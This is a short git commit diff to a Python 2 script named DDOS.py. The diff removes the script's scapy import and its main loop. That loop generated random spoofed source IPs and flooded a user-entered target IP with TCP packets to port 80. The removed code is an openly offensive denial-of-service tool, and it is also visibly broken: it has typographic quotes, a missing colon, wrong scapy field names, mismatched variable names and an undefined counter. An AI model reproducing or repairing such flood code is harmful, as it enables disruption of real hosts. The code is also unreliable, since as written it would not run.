82fccf9e73fc3486d17c4b1d3b7db16eb6a5115e
medalyDragon <55749048+medalyDragon@users.noreply.github.com>
2019-10-16 14:13:20 +0000

    Update DDOS.py

--- DDOS.py
+++ DDOS.py
@@ -1,7 +1,6 @@
 #!/usr/bin/python 2.7
 
-from scapy.all import*
-import random
+
 
 print '''
 \033[1;31;40m
@@ -35,19 +34,3 @@ print "\033[1;3q;40m ======================================"
 target_IP = raw_input("Enter IP of Target: ")
 print "\033[1;31;40m ======================================"
 
-while True:
-   a = str(random.randint(1,254))
-   b = str(random.randint(1,254))
-   c = str(random.randint(1,254))
-   d = str(random.randint(1,254))
-   dot = “.”
-   Source_ip = a + dot + b + dot + c + dot + d
- 
-   for source_port in range(1, 65535)
-      IP1 = IP(source_IP = source_IP, destination = target_IP)
-      TCP1 = TCP(srcport = source_port, dstport = 80)
-      pkt = IP1 / TCP1
-      send(pkt,inter = .001)
-   
-      print ("packet sent ", i)
-         i = i + 1
